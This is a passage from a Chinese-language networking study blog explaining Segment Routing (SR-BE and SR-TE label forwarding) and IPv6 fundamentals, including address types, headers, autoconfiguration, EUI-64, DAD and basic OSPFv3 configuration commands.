title="2.1.1 SR产生背景"></a>2.1.1 SR产生背景</h4><ol><li><p>LDP面临的问题</p><ul><li><p>LDP ( Label Distribute Protocol )︰标签分发协议，根据不同的目的地址来分配标签，使用标签转发代替了IP转发，其优点为可以隔离公网私网路由，跟随路由的最佳路径选择转发路径，支持ECMP，配置简单</p></li><li><p>LDP协议依赖于IGP协议，使用本地标签交换，支持ECMP</p></li><li><p>缺点∶LDP本身有11种协议报文，在应用时大大增加了链路带宽的消耗和设备CPU利用率</p></li><li><p>语音、数据、视频、VR等不同类型的业务对网络的要求不尽相同，对带宽的要求也不断增长，网络规模呈爆炸式增长</p></li><li><p>传统MPLS技术需要专门的标签分发协议，需要每条LSP分配标签，资源占用大;状态维护协议报文占据大量带宽﹔需要与IGP协议同步，部署维护复杂，可扩展性差。这种网络的运营模式难以满足服务商按需快速部署网络业务的需要，而且OPEX (OPeratingEXpense )随着规模线性增长</p></li><li><p>LDP进行LSP路径计算时依赖与IGP路由表</p></li><li><p>LDP只支持IGP最短路径(最小开销)进行路径计算，不支持TE(流量工程)</p></li></ul></li><li><p>RSVP面临的问题</p><ul><li>RSVP依据CSPF算路结果逐跳形成端到端的LSP，标签为本地标签</li><li>逐跳，途经节点均会维护该Tunnel的状态信息，即便SDN化，仍需维护RSVP TE配置复杂</li><li>ECMP实现复杂</li><li>8种RSVP协议报文占据网络带宽和CPU处理</li><li>RSVP(Resource Reservation Protocol)∶资源预留协议，为了解决传统IP网络只能最优路径转发，无法规划路径的问题，引入了RSVP-TE</li><li>RSVP-TE引入带来了很多好处，可以做路径的显式规划、带宽资源预留以及多种的保护</li><li>RSVP依赖IGP建立后，会维护自己的邻居、链路状态，控制面复杂化，增加网络维护、问题定位复杂度</li><li>RSVP-TE需要建立多条隧道来完成ECMP功能</li><li>LSP状态维护需要PATH、RESV不断刷新，业务增多后，带来了中间点的性能问题(承受业务叠加）</li><li>而且RSVP-TE隧道的配置量，一直被运营商所诟病。平均一个隧道要8条配置</li><li>RSVP在负载分担方面实现复杂，需要配置多条Tunnel来实现，给配置和维护带来巨大的工作量</li></ul></li><li><p>SR技术的诞生</p><ul><li>SDN ( Software Defined Network )，即软件定义网络，是由美国斯坦福大学cleanslate研究组提出的一种新型网络创新架构。其核心技术是通过将网络设备控制面与数据面分离开来，从而实现了网络流量的灵活控制，为核心网络及应用的创新提供了良好的平台</li><li>革命型SDN网络采用集中式控制架构，网络设备的控制功能(如路由计算)集中到一个控制器上去处理，转发表由控制器生成下发到设备上。设备功能大大简化，只负责转发，变成了一个傻瓜式的设备，Openflow是Controller和设备之间的控制接口</li><li>增量型SDN网络是将现有网络进行拓展，现有设备向SDN演进思路，设备保留部分控制功能，把部分需要集中控制的功能放到控制器上去处理，强调设备平滑演进能力</li></ul></li><li><p>SR的技术框架</p><p>SR是一种只需在源（显式路径加载的节点）节点给报文增加一系列的段标识，便可指导报文转发的技术方案</p><p><img src="https://pic.imgdb.cn/item/60f7a0885132923bf8c5a1ea.png"></p></li></ol><h3 id="2-2-SR原理解析"><a href="#2-2-SR原理解析" class="headerlink" title="2.2 SR原理解析"></a>2.2 SR原理解析</h3><h4 id="2-2-1-SR基本概念"><a href="#2-2-1-SR基本概念" class="headerlink" title="2.2.1 SR基本概念"></a>2.2.1 SR基本概念</h4><ul><li>SR域( Segment Routing Domain ) : SR节点的集合</li><li>Segment:节点对入口报文执行的指令(如∶依据最短路径转发报文到目的、或通过指定接口转发报文、或将报文转发至指定的应用/业务实例)</li><li>SID( Segment ID ) : Segment标识。Segment Routing将网络中的目的地址前缀/节点和邻接定义为一个个段，并且为这些目的地址前缀/节点和邻接分配段ID。段ID相当于传统MPLS技术中的MPLS标签，在转发层面映射为MPLS标签</li><li>SRGB ( segment routing global block )∶为全局segment预留的本地标签集合。在MPLS中，SRGB为全局标签预留的本地标签集合，在IPv6中，SRGB为全局还未被使用IPv6的地址集合</li><li>标签栈(Segment List)︰标签栈是目的地址前缀SID/节点SID和邻接SID有序列表的排序集合，用于标识一条完整的标签交换路径LSP(Label Switched Path)。在MPLS架构中为标签栈，封装于报文头中指导转发</li></ul><h5 id="2-2-1-1-Segment"><a href="#2-2-1-1-Segment" class="headerlink" title="2.2.1.1 Segment"></a>2.2.1.1 Segment</h5><ul><li><p>SR的基本理念是把网络分为不同的段(Segment)，然后拼接起来，用于指导报文按指定的路径转发</p></li><li><p>SID:即Segment lD，用来标识唯一的段。在转发层面，映射为MPLS标签</p></li><li><p>SR技术中三种基本Segment:邻接段，前辍段和节点段</p><p><img src="https://pic.imgdb.cn/item/60f7bade5132923bf8357dcd.png"></p></li></ul><ol><li><p>Prefix Segment</p><p>基于Prefix Segment:由IGP使用SPF算法计算最短路径，所以也称为SR-BE ( Best Effort )<br>如下图所示，以节点Z为目的节点，其Prefix SID是100。通过IGP扩散之后，整个IGP域的所有设备学习到节点PE2的Prefix SID，之后都会使用SPF算法得出一条到节点PE2的最短路径</p><p><img src="https://pic.imgdb.cn/item/60f7bb215132923bf836ac38.png"></p></li><li><p>Adjacency Segment</p><p>基于Adjacency Segment:头节点指定严格显式路径( Strict Explicit )。这种方式可以集中进行路径调整和流量调优，因此可以更好的配合实现SDN ( Software-Defined Networking ) .Adjacency Segment主要用于SR-TE ( Traffic Engineering ) </p></li><li><p>Adjacency Segment+Node Segment</p><p>基于Adjacency Segment +Node Segment:显式路径与最短路径相结合称作松散路径(Loose Explicit )。主要用于SR-TE</p></li></ol><h5 id="2-2-1-2-SRGB"><a href="#2-2-1-2-SRGB" class="headerlink" title="2.2.1.2 SRGB"></a>2.2.1.2 SRGB</h5><ul><li>SRGB是从本地标签资源隔离出来的一段区间，专门用于SR，以使SR的全局标签和传统MPLS在本地共存</li><li>为节点SID基础，全局唯一的节点标签与本地标签不得冲突:</li><li>SRGB范围和起始值需配置，在起始值基础上对节点SID的索引值进行偏移，得出本地标签</li><li>各设备上的SRGB范围为何不配置为一样?<ul><li>标准中未统一规定SRGB范围，各设备商实现不同</li><li>与传统MPLS共存时，各设备上空余的标签空间不能保证一样</li></ul></li></ul><h4 id="2-2-2-SR工作原理"><a href="#2-2-2-SR工作原理" class="headerlink" title="2.2.2 SR工作原理"></a>2.2.2 SR工作原理</h4><h5 id="2-2-2-1-SR的原理"><a href="#2-2-2-1-SR的原理" class="headerlink" title="2.2.2.1 SR的原理"></a>2.2.2.1 SR的原理</h5><ul><li>SR ( Segment Routing )段路由是对现有IGP协议进行扩展，基于MPLS协议，采用源路由技术而设计的在网络上转发数据包的一种协议</li><li>SR将网络中的目的地址前缀/节点和邻接定义为段，并且为这些段分配SID ( SegmentID)。通过对Adjacency SID（邻接段）和Prefix/Node SID(目的地址前缀/节点段)进行有序排列( Segment List )，就得到一条转发路径</li><li>Segment Routing将代表转发路径的段序列封装在数据包头部，随数据包传输。网络节点收到数据包后，对段序列进行解析，如果段序列的顶部段标识是Node SID，根据SPF计算的最短路径（如果存在等价路径，则可以实现ECMP )转发到该节点，如果是AdjacencySID，则根据Adjacency SID转发到下一节点，直到数据报文到达目的节点</li></ul><h5 id="2-2-2-2-工作原理"><a href="#2-2-2-2-工作原理" class="headerlink" title="2.2.2.2 工作原理"></a>2.2.2.2 工作原理</h5><ol><li><p>SR如何工作(IS-IS SR-BE)(控制平板)</p><p>ISIS：是与OSPF并列的两大IGP协议之一。也采用链路状态算法</p><p>以图中PE1到PE2的LSP为例∶</p><p><img src="https://pic.imgdb.cn/item/60f7bc2d5132923bf83b800f.png"></p><ol><li>Egress PE2设备上LoopBack1接口的环回地址为x.x.x.x/x，为该地址分配的SID为10，并将该信息泛洪到整个IS-IS域</li><li>所有节点收到PE2的Node SID，生成标签转发表：<ul><li>入标签︰本地SRGB起始值+发布的偏移值</li><li>出标签∶下一跳SRGB起始值+发布的偏移值</li><li>出接口下一跳：IGP计算的最短路径的出接口下一跳</li></ul></li><li>Ingress PE1进行IS-IS SPF计算，得到ECMP到PE2的两条最短路径</li></ol></li><li><p>SR如何工作(IS-IS SR-BE)(转发平面)</p><ul><li><p>SR的标签操作类型和MPLS相同，包括标签栈压入( Push )、标签栈交换 (Swap)和标签弹出(Pop )</p></li><li><p>以图中PE1到PE2的SR-BE Tunnel为例:</p><p><img src="https://pic.imgdb.cn/item/60f7bce85132923bf83ed390.png"></p><ol><li><p><strong>Ingress节点PE1</strong>∶接收到业务报文，依据目的地址、标签转发表和ECMP分流算法，封装下一跳P节点分配的出标签，依据目的前缀SID和标签转发表从对应的接口转发出去</p><p>举例︰</p><p>Push 210 to P1</p><p>Push 310 to P2</p></li><li><p><strong>Transit节点</strong>∶依据外层标签及标签转发表，交换出标签为下一跳分配的SR出标签，并从对应的接口转发出去</p><p>举例︰</p><p>Swap 210 to 410 on P1</p><p>Swap 310 to 510 on P2</p></li><li><p><strong>Egress节点PE2</strong>∶发现外层标签是自己，弹出外层标签，依据外层地址将业务报文转发给CE设备</p><p>举例︰</p><p>Pop 610 from P3</p><p>Pop 610 from P4</p></li></ol></li></ul></li><li><p>SR如何工作(SR-TE)(控制平面)</p><ol><li><p>标签、标签转发表和拓扑信息生成</p><p>网络中各节点通过IS-IS SR协议为其邻接分配邻接SID，泛洪到整个网络中，并为其分配的本地邻接SID生成标签转发表项。同时生成带有邻接SID信息的拓扑信息</p><p>另外，手动配置的SRGB/前缀SID/节点SID、SR能力、SR算法等信息通过IGP协议报文在IGP域内泛洪。每个节点运行IS-IS SPF来计算每个节点标签的最短转发路径，并生成标签转发表</p></li><li><p> 标签和拓扑信息上报</p></li></ol><p>   网络中各节点通过BGP-LS(BGP Link-State）将带有邻接SID信息的拓扑信息上报给控制器</p><ol start="3"><li><p>路径计算</p><p>控制器采用PCEP ( Path Computation Element)完成标签转发路径计算</p></li><li><p>路径下发</p><p> 控制器通过PCEP下发隧道信息、通过Netconf下发隧道属性信息给隧道首节点。隧道首节点通过PCEP上报隧道状态给控制器</p></li><li><p>隧道创建</p><p>隧道首节点根据控制器下发的标签栈建立SR-TE隧道</p></li></ol></li><li><p>SR如何工作(SR-TE Strict Explicit Path)(转发平面)</p><p><img src="https://pic.imgdb.cn/item/60f7be965132923bf84688eb.png"></p><ul><li><p>以图中PE1到PE2的严格路径SR-TE Tunnel为例：</p><ol><li><p><strong>Ingress节点PE1</strong>∶接收到业务报文，依据业务配置的路由策略或隧道策略确定的SR-TETunnel，封装SR-TE Tunnel对应的标签栈。判断对应的栈顶标签501为邻接SID，则弹出栈顶标签501，封装标签栈其余部分[103,304,406]到业务报文，并依据栈顶标签和标签转发表从对应接口PE1-&gt;P1转发出去</p></li><li><p><strong>Transit节点</strong>:判断栈顶标签为邻接SID，则弹出栈顶标签，并依据栈顶标签及标签转发表从对应接口转发出去</p><p>以P1节点为例∶判断栈顶标签103为邻接SID，则弹出栈顶标签103，并依据栈顶标签103及标签转发表从对应接口P1-&gt;P3转发出去</p></li><li><p><strong>Egress节点PE2</strong>∶依据业务报文外层地址将业务报文转发给CE设备</p></li></ol></li></ul></li><li><p>SR如何工作(SR-TE Loose Explicit Path)(转发平面)</p><ul><li><p>SR设备根据报文头中SR-TE隧道对应的标签栈，对报文进行标签操作。根据栈顶标签逐跳查找转发出接口，指导数据报文转发到隧道目的地址</p></li><li><p>以图中PE1到PE2的松散路径SR-TE Tunnel为例</p><p><img src="https://pic.imgdb.cn/item/60f7bf905132923bf84b3911.png"></p><ol><li><strong>Ingress节点PE1</strong>∶接收到业务报文，依据业务配置的路由策略或隧道策略确定的SR-TE Tunnel，封装SR-TE Tunnel对应的标签栈[1004,403,306]。依据外层标签和标签转发表封装下一跳P节点分配的SR出标签1004，并依据标签转发表从对应接口PE1-&gt;P2转发出去</li><li><strong>Transit节点P2</strong>∶依据外层标签1004和标签转发表，交换外层标签为下一跳分配的出标签1004，并从对应的接口P2-&gt;P4转发出去</li><li><strong>Transit节点P4</strong>∶发现外层标签1004是自己，弹出外层标签1004。判断下一层标签403为邻接SID，将其弹出，并依据标签转发表从对应接口P4-&gt;P3转发出去</li><li><strong>Transit节点P3</strong>∶判断外层标签306为邻接标签，弹出外层标签306，并依据标签转发表从对应接口P3-&gt;PE2转发出去</li><li><strong>Egress节点PE2</strong>∶依据业务报文外层地址将业务报文转发给CE设备</li></ol></li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>网络基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络基础</tag>
      
      <tag>MPLS/SR基本原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IPv6基础介绍,路由基础,DHCPv6原理与配置</title>
    <link href="/2021/07/21/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/IPv6%E4%BB%8B%E7%BB%8D/IPv6%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D,%E8%B7%AF%E7%94%B1%E5%9F%BA%E7%A1%80,DHCPv6%E5%8E%9F%E7%90%86%E4%B8%8E%E9%85%8D%E7%BD%AE/"/>
    <url>/2021/07/21/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/IPv6%E4%BB%8B%E7%BB%8D/IPv6%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D,%E8%B7%AF%E7%94%B1%E5%9F%BA%E7%A1%80,DHCPv6%E5%8E%9F%E7%90%86%E4%B8%8E%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="IPv6基础介绍、路由基础-DHCPv6原理与配置"><a href="#IPv6基础介绍、路由基础-DHCPv6原理与配置" class="headerlink" title="IPv6基础介绍、路由基础,DHCPv6原理与配置"></a>IPv6基础介绍、路由基础,DHCPv6原理与配置</h1><h2 id="1-IPv6基础介绍"><a href="#1-IPv6基础介绍" class="headerlink" title="1. IPv6基础介绍"></a>1. IPv6基础介绍</h2><h3 id="1-1-IPv6地址"><a href="#1-1-IPv6地址" class="headerlink" title="1.1 IPv6地址"></a>1.1 IPv6地址</h3><table><thead><tr><th>版本</th><th>长度</th><th>地址数量</th></tr></thead><tbody><tr><td>IPv4</td><td>32 bit</td><td>4,294,967,296</td></tr><tr><td>IPv6</td><td>128 bit</td><td>340,282,366,920,938,463,463,374,607,431,768,211,456</td></tr></tbody></table><ul><li>在因特网发展初期，IPv4以其协议简单、易于实现、互操作性好的优势而得到快速发展。然而，随着因特网的迅猛发展，IPv4地址不足等设计缺陷也日益明显。IPv4理论上仅仅能够提供的地址数量是43亿，但是由于地址分配机制等原因，实际可使用的数量还远远达不到43亿。因特网的迅猛发展令人始料未及，同时也带来了地址短缺的问题。针对这一问题，曾先后出现过几种解决方案，比如CIDR和NAT。但是CIDR和NAT都有各自的弊端和不能解决的问题，在这样的情况下，IPv6的应用和推广便显得越来越急迫</li><li>IPv6是Internet工程任务组(IETF ）设计的一套规范，它是网络层协议的第二代标准协议，也是IPv4 ( Internet Protocol Version 4 )的升级版本。IPv6与IPv4的最显著区别是，IPv4地址采用32比特标识，而IPv6地址采用128比特标识。128比特的IPv6地址可以划分更多地址层级、拥有更广阔的地址分配空间，并支持地址自动配置</li></ul><h3 id="1-2-IPv6基本包头"><a href="#1-2-IPv6基本包头" class="headerlink" title="1.2 IPv6基本包头"></a>1.2 IPv6基本包头</h3><p><img src="https://pic.imgdb.cn/item/60f7849b5132923bf869bdd3.png"></p><ul><li>IPv6报文由IPv6基本报头、IPv6扩展报头以及上层协议数据单元三部分组成</li><li>基本报头中的各字段解释如下︰<ul><li>Version :版本号，长度为4bit。对于IPv6，该值为6</li><li>Traffic Class :流类别，长度为8bit，它等同于IPv4报头中的TOS字段，表示IPv6数据报文的类或优先级，主要应用于QoS</li><li>Flow Label:流标签，长度为20bit，它用于区分实时流量。流可以理解为特定应用或进程的来自某一源地址发往一个或多个目的地址的连续单播、组播或任播报文。IPv6中的流标签字段、源地址字段和目的地址字段一起为特定数据流指定了网络中的转发路径。这样，报文在IP网络中传输时会保持原有的顺序，提高了处理效率。随着三网合一的发展趋势，IP网络不仅要求能够传输传统的数据报文，还需要能够传输语音、视频等报文。这种情况下，流标签字段的作用就显得更加重要</li><li>Payload Length:有效载荷长度，长度为16bit，它是指紧跟IPv6报头的数据报文的其它部分</li><li>Next Header : 下一个报头，长度为8bit。该字段定义了紧跟在IPv6报头后面的第一个扩展报头(如果存在)的类型</li><li>跳数限制(Hop Limit )，长度为8bit，该字段类似于IPv4报头中的Time to Live字段，它定义了IP数据报文所能经过的最大跳数。每经过一个路由器，该数值减去1;当该字段的值为0时，数据报文将被丢弃</li><li>Source Address:源地址，长度为128bit，表示发送方的地址</li><li>Destination Address:目的地址，长度为128bit，表示接收方的地址</li></ul></li><li>与IPv4相比，IPv6报头去除了IHL、Identifier、Flags、Fragment Offset、Header<br>  Checksum、Options、Padding域，只增了流标签域，因此IPv6报文头的处理较IPv4大大简化，提高了处理效率。另外，IPv6为了更好支持各种选项处理，提出了扩展头的概念</li></ul><h3 id="1-3-IPv6扩展报头"><a href="#1-3-IPv6扩展报头" class="headerlink" title="1.3 IPv6扩展报头"></a>1.3 IPv6扩展报头</h3><p><img src="https://pic.imgdb.cn/item/60f7855f5132923bf86c39ce.png"></p><ul><li>IPv6增加了扩展报头，使得IPv6报头更加简化。一个IPv6报文可以包含0个、1个或多个扩展报头，仅当需要路由器或目的节点做某些特殊处理时，才由发送方添加一个或多个扩展头。IPv6支持多个扩展报头，各扩展报头中都含有一个下一个报头字段，用于指明下一个扩展报头的类型。这些报头必须按照以下顺序出现∶<ol><li>IPv6基本报头</li><li>逐跳选项扩展报头</li><li>目的选项扩展报头</li><li>路由扩展报头</li><li>分片扩展报头</li><li>认证扩展报头</li><li>封装安全有效载荷扩展报头</li><li>目的选项扩展报头（指那些将被分组报文的最终目的地处理的选项)</li><li>上层协议数据报文</li></ol></li><li>除了目的选项扩展报头外，每个扩展报头在一个报文中最多只能出现一次。目的选项扩展报头在一个报文中最多也只能出现两次，一次是在路由扩展报头之前，另一次是在上层协议扩展报头之前</li></ul><h3 id="1-4-IPv6地址格式"><a href="#1-4-IPv6地址格式" class="headerlink" title="1.4 IPv6地址格式"></a>1.4 IPv6地址格式</h3><ul><li>IPv6地址长度为128比特，用于标识一个或一组接口</li><li>IPv6地址通常写作16个二进制数;八组xxxx共同组成了一个128比特的IPv6地址。一个IPv6地址由IPv6地址前缀和接口ID组成，IPv6地址前缀用来标识IPv6网络，接口ID用来标识接口</li><li>压缩格式：<ul><li>由于IPv6地址长度为128比特，书写时会非常不方便。此外，IPv6地址的巨大地址空间使得地址中往往会包含多个0。为了应对这种情况，IPv6提供了压缩方式来简化地址的书写。压缩规则如下︰</li><li>每16比特组中的前导0可以省略</li><li>地址中包含的连续两个或多个均为0的组，可以用双冒号“”来代替。需要注意的是，在一个IPv6地址中只能使用一次双冒号“:”，否则，设备将压缩后的地址恢复成128位时，无法确定每段中0的个数</li><li>本示例展示了如何利用压缩规则对IPv6地址进行简化表示</li><li><img src="https://pic.imgdb.cn/item/60f7860a5132923bf86e6826.png"></li></ul></li></ul><h3 id="1-5-IPv6地址分类"><a href="#1-5-IPv6地址分类" class="headerlink" title="1.5 IPv6地址分类"></a>1.5 IPv6地址分类</h3><table><thead><tr><th>地址范围</th><th>描述</th></tr></thead><tbody><tr><td>2000::/3</td><td>全球单播地址</td></tr><tr><td>FC00::/7</td><td>唯一本地地址</td></tr><tr><td>FE80::/10</td><td>链路本地地址</td></tr><tr><td>FF00::/8</td><td>组播地址</td></tr><tr><td>::/128</td><td>未指定地址</td></tr><tr><td>::1/128</td><td>环回地址</td></tr></tbody></table><ul><li>目前，IPv6地址空间中还有很多地址尚未分配。这一方面是因为IPv6有着巨大的地址空间，足够在未来很多年使用，另一方面是因为寻址方案还有待发展，同时关于地址类型的适用范围也多有值得商榷的地方</li><li>目前，有一小部分全球单播地址已经由IANA(互联网名称与数字地址分配机构ICANN的一个分支)分配给了用户。单播地址的格式是2000:/3，代表公共IP网络上任意可及的地址。IANA负责将该段地址范围内的地址分配给多个区域互联网注册管理机构（RIR )。RIR负责全球5个区域的地址分配。以下几个地址范围已经分配︰2400:/12(APNIC)、2600:/12(ARIN)、2800:/12 (LACNIC)、2A00:/12(RIPE NCC)和2CO0:/12(AfriNIC)，它们使用单一地址前缀标识特定区域中的所有地址。2000:/3地址范围中还为文档示例预留了地址空间，例如2001:ODB8:/32</li><li>链路本地地址只能在连接到同一本地链路的节点之间使用。可以在自动地址分配、邻居发现和链路上没有路由器的情况下使用链路本地地址。以链路本地地址为源地址或目的地址的IPv6报文不会被路由器转发到其他链路</li><li>链路本地地址的前缀是FE80::/10</li><li>组播地址的前缀是FF00::/8。组播地址范围内的大部分地址都是为特定组播组保留的。跟IPv4一样，IPv6组播地址还支持路由协议。IPv6中没有广播地址。组播地址替代广播地址可以确保报文只发送给特定的组播组而不是IPv6网络中的任意终端</li><li>IPv6还包括一些特殊地址，比如未指定地址::/128。如果没有给一个接口分配IP地址，该接口的地址则为::/128。需要注意的是，不能将未指定地址跟默认IP地址::/0相混淆。默认IP地址::/0跟IPv4中的默认地址0.0.0.0/0类似。环回地址127.0.0.1在IPv6中被定义为保留地址::1/128</li></ul><h3 id="1-6-IPv6单播地址"><a href="#1-6-IPv6单播地址" class="headerlink" title="1.6 IPv6单播地址"></a>1.6 IPv6单播地址</h3><ul><li>单播地址主要包含全球单播地址和链路本地地址。全球单播地址（例2000::/3)带有固定的地址前缀，即前三位为固定值001。其地址结构是一个三层结构，依次为全球路由前缀、子网标识和接口标识。全球路由前缀由RIR和互联网服务供应商（ISP)组成，RIR为ISP分配IP地址前缀。子网标识定义了网络的管理子网</li><li>链路本地单播地址的前缀为FE80::/10，表示地址最高10位值为1111111010。前缀后面紧跟的64位是接口标识，这64位已足够主机接口使用，因而链路本地单播地址的剩余54位为0</li></ul><h3 id="1-7-IPv6组播地址"><a href="#1-7-IPv6组播地址" class="headerlink" title="1.7 IPv6组播地址"></a>1.7 IPv6组播地址</h3><ul><li>IPv6的组播与IPv4相同，用来标识一组接口，一般这些接口属于不同的节点。一个节点可能属于0到多个组播组。目的地址为组播地址的报文会被该组播地址标识的所有接口接收</li><li>一个IPv6组播地址是由前缀、标志(Flag )字段、范围( Scope )字段以及组播组ID( Group ID )4个部分组成︰<ol><li>前缀:IPv6组播地址的前缀是FF00::/8 ( 1111 1111 )</li><li>标志字段(Flag )︰长度4bit，目前只使用了最后一个比特(前三位必须置0），当该位值为0时，表示当前的组播地址是由IANA所分配的一个永久分配地址;当该值为1时，表示当前的组播地址是一个临时组播地址(非永久分配地址)</li><li>范围字段( Scope ):长度4bit，用来限制组播数据流在网络中发送的范围</li><li>组播组ID (Group ID):长度112bit，用以标识组播组。目前，RFC2373并没有将所有的112位都定义成组标识，而是建议仅使用该112位的最低32位作为组播组ID，将剩余的80位都置0，这样，每个组播组ID都可以映射到一个唯一的以太网组播MAC地址( RFC2464 )</li></ol></li></ul><h3 id="1-8-IPv6任播地址"><a href="#1-8-IPv6任播地址" class="headerlink" title="1.8 IPv6任播地址"></a>1.8 IPv6任播地址</h3><ul><li>任播地址标识一组网络接口（通常属于不同的节点)。目标地址是任播地址的数据包将发送给其中路由意义上最近的一个网络接口。任播过程涉及一个任播报文发起方和一个或多个响应方。任播报文的发起方通常为请求某一服务（DNS查找)的主机或请求返还特定数据（例如，HTTP网页信息)的主机。任播地址与单播地址在格式上无任何差异，唯一的区别是一台设备可以给多台具有相同地址的设备发送报文</li><li>企业网络中运用任播地址有很多优势。其中一个优势是业务冗余。比如，用户可以通过多台使用相同地址的服务器获取同一个服务（例如，HTTP)。这些服务器都是任播报文的响应方。如果不是采用任播地址通信，当其中一台服务器发生故障时，用户需要获取另一台服务器的地址才能重新建立通信。如果采用的是任播地址，当一台服务器发生故障时，任播报文的发起方能够自动与使用相同地址的另一台服务器通信，从而实现业务冗余</li><li>使用多服务器接入还能够提高工作效率。例如，用户（即任播地址的发起方）浏览公司网页时，与相同的单播地址建立一条连接，连接的对端是具有相同任播地址的多个服务器。用户可以从不同的镜像服务器分别下载html文件和图片。用户利用多个服务器的带宽同时下载网页文件，其效率远远高于使用单播地址进行下载</li></ul><h3 id="1-9-IPv6无状态地址自动配置"><a href="#1-9-IPv6无状态地址自动配置" class="headerlink" title="1.9 IPv6无状态地址自动配置"></a>1.9 IPv6无状态地址自动配置</h3><ul><li>IPv6支持无状态地址自动配置，无需使用诸如DHCP之类的辅助协议，主机即可获取IPv6前缀并自动生成接口ID。路由器发现功能是IPv6地址自动配置功能的基础，主要通过以下两种报文实现:<ol><li>RA报文∶每台路由器为了让二层网络上的主机和其它路由器知道自己的存在，定期以组播方式发送携带网络配置参数的RA报文。RA报文的Type字段值为134</li><li>RS报文∶主机接入网络后可以主动发送RS报文。RA报文是由路由器定期发送的，但是如果主机希望能够尽快收到RA报文，它可以立刻主动发送RS报文给路由器。网络上的路由器收到该RS报文后会立即向相应的主机单播回应RA报文，告知主机该网段的默认路由器和相关配置参数。RS报文的Type字段值为133</li></ol></li></ul><h3 id="1-10-EUI-64规范"><a href="#1-10-EUI-64规范" class="headerlink" title="1.10 EUI-64规范"></a>1.10 EUI-64规范</h3><ul><li>为了通过IPv6网络进行通信，各接口必须获取有效的IPv6地址，以下三种方式可以用来配置IPv6地址的接口ID∶网络管理员手动配置;通过系统软件生成﹔采用扩展唯一标识符(EUI-64）格式生成。就实用性而言，EUI-64格式是IPv6生成接口ID的最常用方式。IEEEEUI-64标准采用接口的MAC地址生成Pv6接口ID。MAC地址只有48位，而接口ID却要求64位。MAC地址的前24位代表厂商ID，后24位代表制造商分配的唯一扩展标识</li><li>MAC地址的第七高位是一个U/L位，值为0时表示MAC地址全局唯一，值为1时表示MAC地址本地唯一</li><li>在MAC地址向EUI-64格式的转换过程中，在MAC地址的前24位和后24位之间插入了16比特的FFFE，并将U/L位的值从0变成了1，这样就生成了一个64比特的接口ID，且接口ID的值全局唯一。接口ID和接口前缀一起组成接口地址</li></ul><h3 id="1-11-IPv6无状态地址DAD检查"><a href="#1-11-IPv6无状态地址DAD检查" class="headerlink" title="1.11 IPv6无状态地址DAD检查"></a>1.11 IPv6无状态地址DAD检查</h3><p>设备在给接口分配IPv6单播地址之前会进行重复地址检测(DAD)，确认是否有其它的节点使用了该地址。尤其是在地址自动配置的时候，进行DAD检测是很必要的。一个IPv6单播地址在分配给一个接口之后且通过重复地址检测之前称为试验地址，此时该接口不能使用这个试验地址进行单播通信，但是仍然会加入两个组播组:ALL-nodes组播组和Solicited-node组播组。Solicited-node组播组由单播或任播地址的后24位加上地址前缀FF02:0:0:0:0:1:FF00:/104组成。例，本示例中配置的试验地址为2000:1，该地址被加入Solicited-node组播组FF02::1:FF00:1</p><p>IPv6重复地址检测技术和IPv4中的免费ARP类似︰用于地址分配或主机连接网络时检测重复的IPv4主机地址。节点向一个自己将使用的试验地址所在的Solicited-node组播组发送一个以该试验地址为请求的目标地址的邻居请求(NS)报文，如果收到某个其它站点回应的邻居通告（NA)报文，就证明该地址已被网络上使用，节点将不能使用该试验地址进行通信。这种情况下，网络管理员需要手动为该节点分配另外一个地址</p><h2 id="2-IPv6路由基础"><a href="#2-IPv6路由基础" class="headerlink" title="2. IPv6路由基础"></a>2. IPv6路由基础</h2><h3 id="2-1-OSPFv3"><a href="#2-1-OSPFv3" class="headerlink" title="2.1 OSPFv3"></a>2.1 OSPFv3</h3><ul><li>OSPFv3是运行在Pv6网络的OSPF协议。运行OSPFv3的路由器使用物理接口的链路本地单播地址为源地址来发送OSPF报文。相同链路上的路由器互相学习与之相连的其它路由器的链路本地地址，并在报文转发的过程中将这些地址当成下一跳信息使用，虚链路的场景不在本课程的讨论范围内</li><li>IPv6中使用组播地址ff02::5来表示AlISPFRouters，而OSPFv2中使用的是组播地址224.0.0.5。需要注意的是，OSPFv3和OSPFv2版本互不兼容</li></ul><h3 id="2-2-DR-amp-BDR"><a href="#2-2-DR-amp-BDR" class="headerlink" title="2.2 DR&amp;BDR"></a>2.2 DR&amp;BDR</h3><p>Router ID在OSPFv3中也是用于标识路由器的。与OSPFv2的Router ID不同，OSPFv3的Router ID必须手工配置;如果没有手工配置Router ID ，OSPFv3将无法正常运行。OSPFv3在广播型网络和NBMA网络中选举DR和BDR的过程与OSPFv2相似。<br>IPv6使用组播地址FF02:6表示AllDRouters，而OSPFv2中使用的是组播地址224.0.0.6。</p><p>OSPFv3是基于链路而不是网段的。在配置OSPFv3时，不需要考虑路由器的接口是否配置在同一网段，只要路由器的接口连接在同一链路上，就可以不配置IPv6全局地址而直接建立联系。这一变化影响了OSPFv3协议报文的接收、Hello报文的内容以及网络LSA的内容</p><h3 id="2-3-OSPFv3认证与配置"><a href="#2-3-OSPFv3认证与配置" class="headerlink" title="2.3 OSPFv3认证与配置"></a>2.3 OSPFv3认证与配置</h3><ul><li><p>认证：OSPFv3直接使用IPv6的扩展头部(AH和ESP)来实现认证及安全处理，不再需要OSPFv3自身来完成认证</p></li><li><p><code>ipv6</code>命令用来使能路由器的IPv6功能。要在路由器上运行OSPFv3协议，首先必须使能IPv6功能</p></li><li><p><code>ospfv3 [process-id ]</code>命令用来创建并运行OSPFv3进程，<em>process-ia</em> 取值范围是1～65535。如果不指定进程号，缺省使用进程号1</p></li><li><p><code>router-id router-id</code>命令用来设置运行OSPFv3协议的路由器ID号</p></li><li><p><code>ipv6 enable</code>命令用来在路由器接口上使能Pv6，使得接口能够接收和转发IPv6报文。接口的IPv6功能默认是去使能的。<code>ipv6 address &lt;link local address&gt; link-local</code>命令用来手动为接口配置链路本地地址</p></li><li><p><code>ospfv3 process-id area area-id</code>命令用来在接口上使能OSPFv3的进程，并指定所属区域</p></li><li><p>本示例中</p><p><img 